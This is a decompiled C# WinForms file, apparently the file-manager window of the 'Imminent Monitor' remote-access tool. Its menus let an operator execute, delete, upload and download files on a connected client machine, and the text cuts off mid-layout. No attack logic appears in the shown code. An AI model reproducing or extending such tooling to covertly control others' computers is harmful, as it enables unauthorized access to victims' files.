// Decompiled with JetBrains decompiler
// Type: FormFileManager
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using CefSharp;
using CefSharp.WinForms;
using ImminentMonitor.Cef;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Windows.Forms.Layout;

[DesignerGenerated]
public sealed class FormFileManager : Form
{
  private IContainer icontainer_0;
  private GControl6 gcontrol6_0;
  private TabPage tabPage_0;
  private TabPage tabPage_1;
  private ContextMenuStrip contextMenuStrip_0;
  private ToolStripMenuItem toolStripMenuItem_0;
  private ToolStripMenuItem toolStripMenuItem_1;
  private ToolStripMenuItem toolStripMenuItem_2;
  private ToolStripMenuItem toolStripMenuItem_3;
  private ToolStripMenuItem toolStripMenuItem_4;
  private ToolStripMenuItem toolStripMenuItem_5;
  private ToolStripMenuItem toolStripMenuItem_6;
  private ToolStripMenuItem toolStripMenuItem_7;
  private ToolStripMenuItem toolStripMenuItem_8;
  private ToolStripMenuItem toolStripMenuItem_9;
  private ToolStripMenuItem toolStripMenuItem_10;
  private ToolStripMenuItem toolStripMenuItem_11;
  private ToolStripMenuItem toolStripMenuItem_12;
  private ToolStripMenuItem toolStripMenuItem_13;
  private ToolStripSeparator toolStripSeparator_0;
  private ToolStripMenuItem toolStripMenuItem_14;
  private ToolStripMenuItem toolStripMenuItem_15;
  private ToolStripMenuItem toolStripMenuItem_16;
  private ToolStripMenuItem toolStripMenuItem_17;
  private ToolStripMenuItem toolStripMenuItem_18;
  private ToolStripMenuItem toolStripMenuItem_19;
  private ToolStripMenuItem toolStripMenuItem_20;
  private ToolStripMenuItem toolStripMenuItem_21;
  private GClass41 gclass41_0;
  private ColumnHeader columnHeader_0;
  private ColumnHeader columnHeader_1;
  private ColumnHeader columnHeader_2;
  private ColumnHeader columnHeader_3;
  private ColumnHeader columnHeader_4;
  private ImageList imageList_0;
  private Timer timer_0;
  private ContextMenuStrip contextMenuStrip_1;
  private ContextMenuStrip contextMenuStrip_2;
  private ToolStripMenuItem toolStripMenuItem_22;
  private ToolStripSeparator toolStripSeparator_1;
  private ToolStripMenuItem toolStripMenuItem_23;
  private ToolStripMenuItem toolStripMenuItem_24;
  private ToolStripMenuItem toolStripMenuItem_25;
  private ToolStripSeparator toolStripSeparator_2;
  private ToolStripMenuItem toolStripMenuItem_26;
  private GControl6 gcontrol6_1;
  private TabPage tabPage_2;
  private GClass41 gclass41_1;
  private ColumnHeader columnHeader_5;
  private ColumnHeader columnHeader_6;
  private ColumnHeader columnHeader_7;
  private ColumnHeader columnHeader_8;
  private TabPage tabPage_3;
  private Label label_0;
  private LinkLabel linkLabel_0;
  private GClass41 gclass41_2;
  private ColumnHeader columnHeader_9;
  private ColumnHeader columnHeader_10;
  private Label label_1;
  private GControl8 gcontrol8_0;
  private TextBox textBox_0;
  private Label label_2;
  private ComboBox comboBox_0;
  private LinkLabel linkLabel_1;
  private Control0 control0_0;
  private GClass18 gclass18_0;
  private string string_0;
  private ChromiumWebBrowser chromiumWebBrowser_0;
  private bool bool_0;
  private FormUploadDialog formUploadDialog_0;

  public FormFileManager(GClass18 gclass18_1)
  {
    this.Load += new EventHandler(this.FormFileManager_Load);
    this.string_0 = (string) null;
    this.bool_0 = false;
    this.InitializeComponent();
    this.gclass18_0 = gclass18_1;
    this.Text = string.Format("{0}/{1}", (object) this.gclass18_0.method_20().string_15, (object) this.gclass18_0.method_20().string_1);
    this.method_44();
    Class97.smethod_15(this.vmethod_6());
    Class97.smethod_15(this.vmethod_72());
    Class97.smethod_15(this.vmethod_70());
    this.gclass18_0.method_20().formFileManager_0 = this;
    Class97.smethod_11((Form) this);
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.icontainer_0 = (IContainer) new System.ComponentModel.Container();
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormFileManager));
    this.vmethod_7(new ContextMenuStrip(this.icontainer_0));
    this.vmethod_9(new ToolStripMenuItem());
    this.vmethod_11(new ToolStripMenuItem());
    this.vmethod_13(new ToolStripMenuItem());
    this.vmethod_15(new ToolStripMenuItem());
    this.vmethod_17(new ToolStripMenuItem());
    this.vmethod_19(new ToolStripMenuItem());
    this.vmethod_21(new ToolStripMenuItem());
    this.vmethod_23(new ToolStripMenuItem());
    this.vmethod_25(new ToolStripMenuItem());
    this.vmethod_27(new ToolStripMenuItem());
    this.vmethod_29(new ToolStripMenuItem());
    this.vmethod_31(new ToolStripMenuItem());
    this.vmethod_33(new ToolStripMenuItem());
    this.vmethod_35(new ToolStripMenuItem());
    this.vmethod_37(new ToolStripSeparator());
    this.vmethod_39(new ToolStripMenuItem());
    this.vmethod_41(new ToolStripMenuItem());
    this.vmethod_43(new ToolStripMenuItem());
    this.vmethod_45(new ToolStripMenuItem());
    this.vmethod_47(new ToolStripMenuItem());
    this.vmethod_49(new ToolStripMenuItem());
    this.vmethod_51(new ToolStripMenuItem());
    this.vmethod_53(new ToolStripMenuItem());
    this.vmethod_67(new ImageList(this.icontainer_0));
    this.vmethod_69(new Timer(this.icontainer_0));
    this.vmethod_71(new ContextMenuStrip(this.icontainer_0));
    this.vmethod_83(new ToolStripMenuItem());
    this.vmethod_85(new ToolStripSeparator());
    this.vmethod_87(new ToolStripMenuItem());
    this.vmethod_73(new ContextMenuStrip(this.icontainer_0));
    this.vmethod_75(new ToolStripMenuItem());
    this.vmethod_77(new ToolStripSeparator());
    this.vmethod_79(new ToolStripMenuItem());
    this.vmethod_81(new ToolStripMenuItem());
    this.vmethod_1(new GControl6());
    this.vmethod_3(new TabPage());
    this.vmethod_89(new GControl6());
    this.vmethod_91(new TabPage());
    this.vmethod_125(new LinkLabel());
    this.vmethod_93(new GClass41());
    this.vmethod_95(new ColumnHeader());
    this.vmethod_97(new ColumnHeader());
    this.vmethod_99(new ColumnHeader());
    this.vmethod_101(new ColumnHeader());
    this.vmethod_103(new TabPage());
    this.vmethod_105(new Label());
    this.vmethod_107(new LinkLabel());
    this.vmethod_109(new GClass41());
    this.vmethod_111(new ColumnHeader());
    this.vmethod_113(new ColumnHeader());
    this.vmethod_115(new Label());
    this.vmethod_117(new GControl8());
    this.vmethod_119(new TextBox());
    this.vmethod_121(new Label());
    this.vmethod_123(new ComboBox());
    this.vmethod_5(new TabPage());
    this.vmethod_55(new GClass41());
    this.vmethod_57(new ColumnHeader());
    this.vmethod_59(new ColumnHeader());
    this.vmethod_61(new ColumnHeader());
    this.vmethod_63(new ColumnHeader());
    this.vmethod_65(new ColumnHeader());
    this.vmethod_127(new Control0());
    this.vmethod_6().SuspendLayout();
    this.vmethod_70().SuspendLayout();
    this.vmethod_72().SuspendLayout();
    this.vmethod_0().SuspendLayout();
    this.vmethod_2().SuspendLayout();
    this.vmethod_88().SuspendLayout();
    this.vmethod_90().SuspendLayout();
    this.vmethod_102().SuspendLayout();
    this.vmethod_4().SuspendLayout();
    this.SuspendLayout();
    this.vmethod_6().Font = new Font("Verdana", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_6().Items.AddRange(new ToolStripItem[10]
    {
      (ToolStripItem) this.vmethod_8(),
      (ToolStripItem) this.vmethod_36(),
      (ToolStripItem) this.vmethod_38(),
      (ToolStripItem) this.vmethod_40(),
      (ToolStripItem) this.vmethod_42(),
      (ToolStripItem) this.vmethod_44(),
      (ToolStripItem) this.vmethod_46(),
      (ToolStripItem) this.vmethod_48(),
      (ToolStripItem) this.vmethod_50(),
      (ToolStripItem) this.vmethod_52()
    });
    this.vmethod_6().Name = "ContextMenuStrip1";
    ContextMenuStrip contextMenuStrip1 = this.vmethod_6();
    Size size1 = new Size(154, 230);
    Size size2 = size1;
    contextMenuStrip1.Size = size2;
    this.vmethod_6().Tag = (object) "SEPERATOR";
    this.vmethod_8().DropDownItems.AddRange(new ToolStripItem[13]
    {
      (ToolStripItem) this.vmethod_10(),
      (ToolStripItem) this.vmethod_12(),
      (ToolStripItem) this.vmethod_14(),
      (ToolStripItem) this.vmethod_16(),
      (ToolStripItem) this.vmethod_18(),
      (ToolStripItem) this.vmethod_20(),
      (ToolStripItem) this.vmethod_22(),
      (ToolStripItem) this.vmethod_24(),
      (ToolStripItem) this.vmethod_26(),
      (ToolStripItem) this.vmethod_28(),
      (ToolStripItem) this.vmethod_30(),
      (ToolStripItem) this.vmethod_32(),
      (ToolStripItem) this.vmethod_34()
    });
    this.vmethod_8().Name = "SpecialFilesToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem1 = this.vmethod_8();
    size1 = new Size(153, 22);
    Size size3 = size1;
    toolStripMenuItem1.Size = size3;
    this.vmethod_8().Tag = (object) "0";
    this.vmethod_8().Text = "Shortcuts";
    this.vmethod_10().Image = (Image) Class145.smethod_26();
    this.vmethod_10().Name = "AppDataToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem2 = this.vmethod_10();
    size1 = new Size(152, 22);
    Size size4 = size1;
    toolStripMenuItem2.Size = size4;
    this.vmethod_10().Tag = (object) "SEPERATOR";
    this.vmethod_10().Text = "AppData";
    this.vmethod_12().Image = (Image) Class145.smethod_26();
    this.vmethod_12().Name = "TempToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem3 = this.vmethod_12();
    size1 = new Size(152, 22);
    Size size5 = size1;
    toolStripMenuItem3.Size = size5;
    this.vmethod_12().Tag = (object) "SEPERATOR";
    this.vmethod_12().Text = "Temp";
    this.vmethod_14().Image = (Image) Class145.smethod_26();
    this.vmethod_14().Name = "ProgramFilesToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem4 = this.vmethod_14();
    size1 = new Size(152, 22);
    Size size6 = size1;
    toolStripMenuItem4.Size = size6;
    this.vmethod_14().Tag = (object) "SEPERATOR";
    this.vmethod_14().Text = "Program Files";
    this.vmethod_16().Image = (Image) Class145.smethod_27();
    this.vmethod_16().Name = "StartupToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem5 = this.vmethod_16();
    size1 = new Size(152, 22);
    Size size7 = size1;
    toolStripMenuItem5.Size = size7;
    this.vmethod_16().Tag = (object) "SEPERATOR";
    this.vmethod_16().Text = "Startup";
    this.vmethod_18().Image = (Image) Class145.smethod_26();
    this.vmethod_18().Name = "WindowsToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem6 = this.vmethod_18();
    size1 = new Size(152, 22);
    Size size8 = size1;
    toolStripMenuItem6.Size = size8;
    this.vmethod_18().Tag = (object) "SEPERATOR";
    this.vmethod_18().Text = "Windows";
    this.vmethod_20().Image = (Image) Class145.smethod_26();
    this.vmethod_20().Name = "SystemToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem7 = this.vmethod_20();
    size1 = new Size(152, 22);
    Size size9 = size1;
    toolStripMenuItem7.Size = size9;
    this.vmethod_20().Tag = (object) "SEPERATOR";
    this.vmethod_20().Text = "System";
    this.vmethod_22().Image = (Image) Class145.smethod_26();
    this.vmethod_22().Name = "RecentToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem8 = this.vmethod_22();
    size1 = new Size(152, 22);
    Size size10 = size1;
    toolStripMenuItem8.Size = size10;
    this.vmethod_22().Tag = (object) "SEPERATOR";
    this.vmethod_22().Text = "Recent";
    this.vmethod_24().Image = (Image) Class145.smethod_26();
    this.vmethod_24().Name = "StartMenuToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem9 = this.vmethod_24();
    size1 = new Size(152, 22);
    Size size11 = size1;
    toolStripMenuItem9.Size = size11;
    this.vmethod_24().Tag = (object) "SEPERATOR";
    this.vmethod_24().Text = "Start Menu";
    this.vmethod_26().Image = (Image) Class145.smethod_30();
    this.vmethod_26().Name = "DesktopToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem10 = this.vmethod_26();
    size1 = new Size(152, 22);
    Size size12 = size1;
    toolStripMenuItem10.Size = size12;
    this.vmethod_26().Tag = (object) "SEPERATOR";
    this.vmethod_26().Text = "Desktop";
    this.vmethod_28().Image = (Image) Class145.smethod_26();
    this.vmethod_28().Name = "UserProfileToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem11 = this.vmethod_28();
    size1 = new Size(152, 22);
    Size size13 = size1;
    toolStripMenuItem11.Size = size13;
    this.vmethod_28().Tag = (object) "SEPERATOR";
    this.vmethod_28().Text = "UserProfile";
    this.vmethod_30().Image = (Image) Class145.smethod_31();
    this.vmethod_30().Name = "DocumentsToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem12 = this.vmethod_30();
    size1 = new Size(152, 22);
    Size size14 = size1;
    toolStripMenuItem12.Size = size14;
    this.vmethod_30().Tag = (object) "SEPERATOR";
    this.vmethod_30().Text = "Documents";
    this.vmethod_32().Image = (Image) Class145.smethod_29();
    this.vmethod_32().Name = "PicturesToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem13 = this.vmethod_32();
    size1 = new Size(152, 22);
    Size size15 = size1;
    toolStripMenuItem13.Size = size15;
    this.vmethod_32().Tag = (object) "SEPERATOR";
    this.vmethod_32().Text = "Pictures";
    this.vmethod_34().Image = (Image) Class145.smethod_28();
    this.vmethod_34().Name = "MusicToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem14 = this.vmethod_34();
    size1 = new Size(152, 22);
    Size size16 = size1;
    toolStripMenuItem14.Size = size16;
    this.vmethod_34().Tag = (object) "SEPERATOR";
    this.vmethod_34().Text = "Music";
    this.vmethod_36().Name = "ToolStripSeparator5";
    ToolStripSeparator toolStripSeparator1 = this.vmethod_36();
    size1 = new Size(150, 6);
    Size size17 = size1;
    toolStripSeparator1.Size = size17;
    this.vmethod_36().Tag = (object) "SEPERATOR";
    this.vmethod_38().Name = "ExecuteFileToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem15 = this.vmethod_38();
    size1 = new Size(153, 22);
    Size size18 = size1;
    toolStripMenuItem15.Size = size18;
    this.vmethod_38().Tag = (object) "0";
    this.vmethod_38().Text = "Execute";
    this.vmethod_40().Name = "DeleteStripMenuItem";
    ToolStripMenuItem toolStripMenuItem16 = this.vmethod_40();
    size1 = new Size(153, 22);
    Size size19 = size1;
    toolStripMenuItem16.Size = size19;
    this.vmethod_40().Tag = (object) "0";
    this.vmethod_40().Text = "Delete";
    this.vmethod_42().Name = "RenameToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem17 = this.vmethod_42();
    size1 = new Size(153, 22);
    Size size20 = size1;
    toolStripMenuItem17.Size = size20;
    this.vmethod_42().Tag = (object) "0";
    this.vmethod_42().Text = "Rename";
    this.vmethod_44().Name = "CreateFolderToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem18 = this.vmethod_44();
    size1 = new Size(153, 22);
    Size size21 = size1;
    toolStripMenuItem18.Size = size21;
    this.vmethod_44().Tag = (object) "0";
    this.vmethod_44().Text = "Create Folder";
    this.vmethod_46().Name = "SetAsWallpaperToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem19 = this.vmethod_46();
    size1 = new Size(153, 22);
    Size size22 = size1;
    toolStripMenuItem19.Size = size22;
    this.vmethod_46().Tag = (object) "0";
    this.vmethod_46().Text = "Set Wallpaper";
    this.vmethod_48().Name = "ViewThumbnailToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem20 = this.vmethod_48();
    size1 = new Size(153, 22);
    Size size23 = size1;
    toolStripMenuItem20.Size = size23;
    this.vmethod_48().Tag = (object) "0";
    this.vmethod_48().Text = "Thumbnails";
    this.vmethod_50().Name = "ToolStripMenuItem2";
    ToolStripMenuItem toolStripMenuItem21 = this.vmethod_50();
    size1 = new Size(153, 22);
    Size size24 = size1;
    toolStripMenuItem21.Size = size24;
    this.vmethod_50().Tag = (object) "0";
    this.vmethod_50().Text = "Upload";
    this.vmethod_52().Name = "DownloadToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem22 = this.vmethod_52();
    size1 = new Size(153, 22);
    Size size25 = size1;
    toolStripMenuItem22.Size = size25;
    this.vmethod_52().Tag = (object) "0";
    this.vmethod_52().Text = "Download";
    this.vmethod_66().ImageStream = (ImageListStreamer) componentResourceManager.GetObject("ImageListClientFile.ImageStream");
    this.vmethod_66().TransparentColor = Color.Transparent;
    this.vmethod_66().Images.SetKeyName(0, "clientfile.png");
    this.vmethod_68().Interval = 1000;
    this.vmethod_70().Items.AddRange(new ToolStripItem[3]
    {
      (ToolStripItem) this.vmethod_82(),
      (ToolStripItem) this.vmethod_84(),
      (ToolStripItem) this.vmethod_86()
    });
    this.vmethod_70().Name = "ContextMenuStripSearch";
    ContextMenuStrip contextMenuStrip2 = this.vmethod_70();
    size1 = new Size(188, 54);
    Size size26 = size1;
    contextMenuStrip2.Size = size26;
    this.vmethod_82().Name = "DownloadToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem23 = this.vmethod_82();
    size1 = new Size(187, 22);
    Size size27 = size1;
    toolStripMenuItem23.Size = size27;
    this.vmethod_82().Text = "Download";
    this.vmethod_84().Name = "ToolStripSeparator2";
    ToolStripSeparator toolStripSeparator2 = this.vmethod_84();
    size1 = new Size(184, 6);
    Size size28 = size1;
    toolStripSeparator2.Size = size28;
    this.vmethod_86().Name = "OpenInFileManagerToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem24 = this.vmethod_86();
    size1 = new Size(187, 22);
    Size size29 = size1;
    toolStripMenuItem24.Size = size29;
    this.vmethod_86().Text = "Open in File Manager";
    this.vmethod_72().Font = new Font("Verdana", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_72().Items.AddRange(new ToolStripItem[4]
    {
      (ToolStripItem) this.vmethod_74(),
      (ToolStripItem) this.vmethod_76(),
      (ToolStripItem) this.vmethod_78(),
      (ToolStripItem) this.vmethod_80()
    });
    this.vmethod_72().Name = "ContextMenuStrip1";
    ContextMenuStrip contextMenuStrip3 = this.vmethod_72();
    size1 = new Size(204, 76);
    Size size30 = size1;
    contextMenuStrip3.Size = size30;
    this.vmethod_74().Name = "ClearTransferListToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem25 = this.vmethod_74();
    size1 = new Size(203, 22);
    Size size31 = size1;
    toolStripMenuItem25.Size = size31;
    this.vmethod_74().Text = "Clear Transfer List";
    this.vmethod_76().Name = "ToolStripSeparator1";
    ToolStripSeparator toolStripSeparator3 = this.vmethod_76();
    size1 = new Size(200, 6);
    Size size32 = size1;
    toolStripSeparator3.Size = size32;
    this.vmethod_78().Name = "OpenDownloadFolderToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem26 = this.vmethod_78();
    size1 = new Size(203, 22);
    Size size33 = size1;
    toolStripMenuItem26.Size = size33;
    this.vmethod_78().Text = "Open Download Folder";
    this.vmethod_80().Name = "AbortTransfersToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem27 = this.vmethod_80();
    size1 = new Size(203, 22);
    Size size34 = size1;
    toolStripMenuItem27.Size = size34;
    this.vmethod_80().Text = "Abort Transfers";
    this.vmethod_0().Alignment = TabAlignment.Left;
    this.vmethod_0().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_0().Controls.Add((Control) this.vmethod_2());
    this.vmethod_0().Controls.Add((Control) this.vmethod_4());
    this.vmethod_0().DrawMode = TabDrawMode.OwnerDrawFixed;
    GControl6 gcontrol6_1 = this.vmethod_0();
    size1 = new Size(30, 150);
    Size size35 = size1;
    gcontrol6_1.ItemSize = size35;
    GControl6 gcontrol6_2 = this.vmethod_0();
    Point point1 = new Point(275, 79);
    Point point2 = point1;
    gcontrol6_2.Location = point2;
    this.vmethod_0().Multiline = true;
    this.vmethod_0().Name = "MainTab";
    this.vmethod_0().SelectedIndex = 0;
    GControl6 gcontrol6_3 = this.vmethod_0();
    size1 = new Size(713, 559);
    Size size36 = size1;
    gcontrol6_3.Size = size36;
    this.vmethod_0().SizeMode = TabSizeMode.Fixed;
    this.vmethod_0().TabIndex = 0;
    this.vmethod_0().Visible = false;
    this.vmethod_2().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_2().Controls.Add((Control) this.vmethod_88());
    this.vmethod_2().Controls.Add((Control) this.vmethod_114());
    this.vmethod_2().Controls.Add((Control) this.vmethod_116());
    this.vmethod_2().Controls.Add((Control) this.vmethod_118());
    this.vmethod_2().Controls.Add((Control) this.vmethod_120());
    this.vmethod_2().Controls.Add((Control) this.vmethod_122());
    TabPage tabPage1 = this.vmethod_2();
    point1 = new Point(0, 0);
    Point point3 = point1;
    tabPage1.Location = point3;
    this.vmethod_2().Name = "TabPageFileManager";
    TabPage tabPage2 = this.vmethod_2();
    Padding padding1 = new Padding(3);
    Padding padding2 = padding1;
    tabPage2.Padding = padding2;
    TabPage tabPage3 = this.vmethod_2();
    size1 = new Size(713, 559);
    Size size37 = size1;
    tabPage3.Size = size37;
    this.vmethod_2().TabIndex = 0;
    this.vmethod_2().Tag = (object) "normal";
    this.vmethod_2().Text = "File Manager";
    this.vmethod_88().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_88().Controls.Add((Control) this.vmethod_90());
    this.vmethod_88().Controls.Add((Control) this.vmethod_102());
    GControl6 gcontrol6_4 = this.vmethod_88();
    point1 = new Point(3, 47);
    Point point4 = point1;
    gcontrol6_4.Location = point4;
    this.vmethod_88().Name = "HiddenTabControl1";
    this.vmethod_88().SelectedIndex = 0;
    GControl6 gcontrol6_5 = this.vmethod_88();
    size1 = new Size(704, 509);
    Size size38 = size1;
    gcontrol6_5.Size = size38;
    this.vmethod_88().TabIndex = 46;
    this.vmethod_88().Visible = false;
    this.vmethod_90().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_90().Controls.Add((Control) this.vmethod_124());
    this.vmethod_90().Controls.Add((Control) this.vmethod_92());
    TabPage tabPage4 = this.vmethod_90();
    point1 = new Point(0, 0);
    Point point5 = point1;
    tabPage4.Location = point5;
    this.vmethod_90().Name = "TabPageFiles";
    TabPage tabPage5 = this.vmethod_90();
    padding1 = new Padding(3);
    Padding padding3 = padding1;
    tabPage5.Padding = padding3;
    TabPage tabPage6 = this.vmethod_90();
    size1 = new Size(704, 509);
    Size size39 = size1;
    tabPage6.Size = size39;
    this.vmethod_90().TabIndex = 0;
    this.vmethod_124().Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
    this.vmethod_124().AutoSize = true;
    LinkLabel linkLabel1 = this.vmethod_124();
    point1 = new Point(594, 494);
    Point point6 = point1;
    linkLabel1.Location = point6;
    this.vmethod_124().Name = "LinkLabelSearchResults";
    LinkLabel linkLabel2 = this.vmethod_124();
    size1 = new Size(109, 13);
    Size size40 = size1;
    linkLabel2.Size = size40;
    this.vmethod_124().TabIndex = 35;
    this.vmethod_124().TabStop = true;
    this.vmethod_124().Text = "Go to search results";
    this.vmethod_92().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_92().Columns.AddRange(new ColumnHeader[4]
    {
      this.vmethod_94(),
      this.vmethod_96(),
      this.vmethod_98(),
      this.vmethod_100()
    });
    this.vmethod_92().ContextMenuStrip = this.vmethod_6();
    this.vmethod_92().Font = new Font("Segoe UI", 8.25f);
    this.vmethod_92().FullRowSelect = true;
    this.vmethod_92().HideSelection = false;
    GClass41 gclass41_1 = this.vmethod_92();
    point1 = new Point(3, 3);
    Point point7 = point1;
    gclass41_1.Location = point7;
    this.vmethod_92().Name = "ListViewRemoteMachine";
    GClass41 gclass41_2 = this.vmethod_92();
    size1 = new Size(698, 487);
    Size size41 = size1;
    gclass41_2.Size = size41;
    this.vmethod_92().SmallImageList = this.vmethod_66();
    this.vmethod_92().TabIndex = 34;
    this.vmethod_92().UseCompatibleStateImageBehavior = false;
    this.vmethod_92().View = View.Details;
    this.vmethod_94().Text = "Name";
    this.vmethod_94().Width = 233;
    this.vmethod_96().Text = "Size";
    this.vmethod_96().Width = 83;
    this.vmethod_98().Text = "Type";
    this.vmethod_98().Width = 81;
    this.vmethod_100().Text = "Created";
    this.vmethod_100().Width = 178;
    this.vmethod_102().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_102().Controls.Add((Control) this.vmethod_104());
    this.vmethod_102().Controls.Add((Control) this.vmethod_106());
    this.vmethod_102().Controls.Add((Control) this.vmethod_108());
    TabPage tabPage7 = this.vmethod_102();
    point1 = new Point(0, 0);
    Point point8 = point1;
    tabPage7.Location = point8;
    this.vmethod_102().Name = "TabPageS";
    TabPage tabPage8 = this.vmethod_102();
    padding1 = new Padding(3);
    Padding padding4 = padding1;
    tabPage8.Padding = padding4;
    TabPage tabPage9 = this.vmethod_102();
    size1 = new Size(704, 509);
    Size size42 = size1;
    tabPage9.Size = size42;
    this.vmethod_102().TabIndex = 1;
    this.vmethod_102().Text = "TabPage2";
    this.vmethod_104().Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
    this.vmethod_104().AutoSize = true;
    Label label1 = this.vmethod_104();
    point1 = new Point(1, 483);
    Point point9 = point1;
    label1.Location = point9;
    this.vmethod_104().Name = "LabelCurrentDirectory";
    Label label2 = this.vmethod_104();
    size1 = new Size(98, 13);
    Size size43 = size1;
    label2.Size = size43;
    this.vmethod_104().TabIndex = 23;
    this.vmethod_104().Text = "Current Directory:";
    this.vmethod_106().Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
    this.vmethod_106().AutoSize = true;
    LinkLabel linkLabel3 = this.vmethod_106();
    point1 = new Point(1, 495);
    Point point10 = point1;
    linkLabel3.Location = point10;
    this.vmethod_106().Name = "LinkLabelBrowser";
    LinkLabel linkLabel4 = this.vmethod_106();
    size1 = new Size(115, 13);
    Size size44 = size1;
    linkLabel4.Size = size44;
    this.vmethod_106().TabIndex = 22;
    this.vmethod_106().TabStop = true;
    this.vmethod_106().Text = "Back To File Manager";
    this.vmethod_108().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_108().Columns.AddRange(new ColumnHeader[2]
    {
      this.vmethod_110(),
      this.vmethod_112()
    });
    this.vmethod_108().ContextMenuStrip = this.vmethod_70();
    this.vmethod_108().Font = new Font("Segoe UI", 8.25f);
    this.vmethod_108().FullRowSelect = true;
    this.vmethod_108().HideSelection = false;
    GClass41 gclass41_3 = this.vmethod_108();
    point1 = new Point(3, 3);
    Point point11 = point1;
    gclass41_3.Location = point11;
    this.vmethod_108().Name = "AeroListviewSearch";
    GClass41 gclass41_4 = this.vmethod_108();
    size1 = new Size(695, 479);
    Size size45 = size1;
    gclass41_4.Size = size45;
    this.vmethod_108().SmallImageList = this.vmethod_66();
    this.vmethod_108().TabIndex = 21;
    this.vmethod_108().UseCompatibleStateImageBehavior = false;
    this.vmethod_108().View = View.Details;
    this.vmethod_110().Text = "File Name";
    this.vmethod_110().Width = 146;
    this.vmethod_112().Text = "Directory";
    this.vmethod_112().Width = 402;
    this.vmethod_114().Anchor = AnchorStyles.Top | AnchorStyles.Right;
    this.vmethod_114().AutoSize = true;
    Label label3 = this.vmethod_114();
    point1 = new Point(538, 2);
    Point point12 = point1;
    label3.Location = point12;
    this.vmethod_114().Name = "LabelSearch";
    Label label4 = this.vmethod_114();
    size1 = new Size(41, 13);
    Size size46 = size1;
    label4.Size = size46;
    this.vmethod_114().TabIndex = 45;
    this.vmethod_114().Text = "Search";
    this.vmethod_116().Anchor = AnchorStyles.Top | AnchorStyles.Right;
    this.vmethod_116().method_1(componentResourceManager.GetString("ButtonSearch.ImageString"));
    GControl8 gcontrol8_1 = this.vmethod_116();
    point1 = new Point(681, 18);
    Point point13 = point1;
    gcontrol8_1.Location = point13;
    this.vmethod_116().Name = "ButtonSearch";
    GControl8 gcontrol8_2 = this.vmethod_116();
    size1 = new Size(23, 22);
    Size size47 = size1;
    gcontrol8_2.Size = size47;
    this.vmethod_116().TabIndex = 44;
    this.vmethod_116().Text = "RefreshButton4";
    this.vmethod_118().Anchor = AnchorStyles.Top | AnchorStyles.Right;
    TextBox textBox1 = this.vmethod_118();
    point1 = new Point(541, 18);
    Point point14 = point1;
    textBox1.Location = point14;
    this.vmethod_118().Name = "TextBoxSearch";
    TextBox textBox2 = this.vmethod_118();
    size1 = new Size(134, 22);
    Size size48 = size1;
    textBox2.Size = size48;
    this.vmethod_118().TabIndex = 43;
    this.vmethod_120().AutoSize = true;
    Label label5 = this.vmethod_120();
    point1 = new Point(4, 3);
    Point point15 = point1;
    label5.Location = point15;
    this.vmethod_120().Name = "LabelAddress";
    Label label6 = this.vmethod_120();
    size1 = new Size(48, 13);
    Size size49 = size1;
    label6.Size = size49;
    this.vmethod_120().TabIndex = 38;
    this.vmethod_120().Text = "Address";
    this.vmethod_122().Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_122().FormattingEnabled = true;
    ComboBox comboBox1 = this.vmethod_122();
    point1 = new Point(7, 18);
    Point point16 = point1;
    comboBox1.Location = point16;
    this.vmethod_122().Name = "TextBoxClientDirectory";
    ComboBox comboBox2 = this.vmethod_122();
    size1 = new Size(528, 21);
    Size size50 = size1;
    comboBox2.Size = size50;
